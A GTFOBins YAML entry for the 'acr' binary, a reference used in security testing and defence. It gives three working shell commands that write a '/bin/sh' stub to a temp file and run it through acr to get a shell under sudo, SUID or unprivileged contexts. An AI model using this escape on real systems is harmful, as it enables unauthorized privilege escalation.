<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/acr -->
---
functions:
  command:
  - code: |-
      echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
      chmod +x /path/to/temp-file
      acr -r ./relative/path/to/temp-file
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
